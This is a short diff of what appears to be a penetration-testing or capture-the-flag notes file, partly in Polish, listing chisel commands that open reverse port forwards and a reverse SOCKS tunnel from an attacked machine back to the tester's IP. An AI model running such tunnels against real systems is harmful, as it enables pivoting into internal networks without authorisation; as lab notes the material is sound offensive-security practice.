@@ -7,5 +7,5 @@ sudo ./chisel_linux server -p 9001 --reverse                                    
 ./chisel.exe client 10.10.14.9:9001 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091   - atakowana maszyna krok #2
 
 sudo ./chisel server -p 9001 --reverse 
-./chisel client 10.10.15.72:9001 R:socks
-
+./chisel client 10.10.15.72:9001 R:socks -?
+./chisel_linux_386 client 10.10.15.72:9001 R:50080:socks
